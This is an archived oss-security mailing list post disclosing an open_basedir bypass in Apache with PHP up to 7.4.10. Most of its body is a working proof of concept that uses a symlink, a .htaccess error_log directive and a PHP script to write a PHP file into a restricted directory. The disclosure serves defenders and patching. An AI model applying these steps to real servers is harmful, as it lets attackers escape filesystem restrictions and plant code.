X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1162" "Thursday" "17" "September" "2020" "02:41:22" "+0000" "Havijoori" "havijoori@protonmail.com" "<emhIOMW1by5zKGvn1A33fxs2tjH-uFZLnjxdvjNdtX3aXQdAZ_YCxKfPJmbE8pjC4RcrxLCicHjPGPElA6yT29oq-K09pqSZ7ebXukctKHM=@protonmail.com>" "29" "[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass" nil nil nil "9" "2020091702:41:22" "[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass" (number mark "U       havijoori@pr Sep 17   29/1162  " thread-indent "\"[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Apache + PHP <= 7.4.10 open_basedir bypass" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3707 invoked by uid 550); 17 Sep 2020 10:48:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32588 invoked from network); 17 Sep 2020 02:41:35 -0000
Date: Thu, 17 Sep 2020 02:41:22 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=protonmail.com;
	s=protonmail; t=1600310484;
	bh=kC+oCYE/JU4u+nlpNgBYpqTf+nThdaustKddUKpcdcg=;
	h=Date:To:From:Reply-To:Subject:From;
	b=mOu7HPOvaO1/JZPud/w487HPgBvZ77mKt7A8oHmWSwTlG0CUwwFztnnupHCEEj8uo
	 rNykOJwYbMfGuBTeFxxM1e6PhwqraDNHZt3gbxP1iGHwJAT/9jvmOc5jdvUtZzmsfS
	 kweecf28/lzP/swjYzsfNFKyffSmSuqmkc5Ap1BI=
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
From: Havijoori <havijoori@protonmail.com>
Message-ID: <emhIOMW1by5zKGvn1A33fxs2tjH-uFZLnjxdvjNdtX3aXQdAZ_YCxKfPJmbE8pjC4RcrxLCicHjPGPElA6yT29oq-K09pqSZ7ebXukctKHM=@protonmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] Apache + PHP <= 7.4.10 open_basedir bypass

Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
open_basedir security feature can be bypassed when Apache web server runs P=
HP scripts.

Proof of Concept
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
1. Set open_basedir as a security feature in php.ini file :
   open_basedir =3D /var/www/html:/tmp
2. Make a directory with the name of your web server's home directory insid=
e your web server's home directory :
   mkdir -p /var/www/html/var/www/html
3. Make a symlink to a restricted writable directory inside this new direct=
ory :
   ln -s /home/havijoori/www/uploads /var/www/html/var/www/html/test
4. Make a .htaccess file in your web server's root directory to set php val=
ue :
   php_value error_log "var/www/html/test/hacked.php"
5. Make a PHP script, "bypass.php" in your web server's root directory to e=
xploit the vulnerability :
   <?php error_log("<?php phpinfo(); ?>"); ?>
6. Call the script :
   curl http://webserver/bypass.php
7. After successful exploitation, our file "hacked.php" should be created i=
n the restricted directory :
   ls /home/havijoori/www/uploads/hacked.php

Tested with PHP 5.2.5 and 7.x.
Similar to CVE-2007-3378.
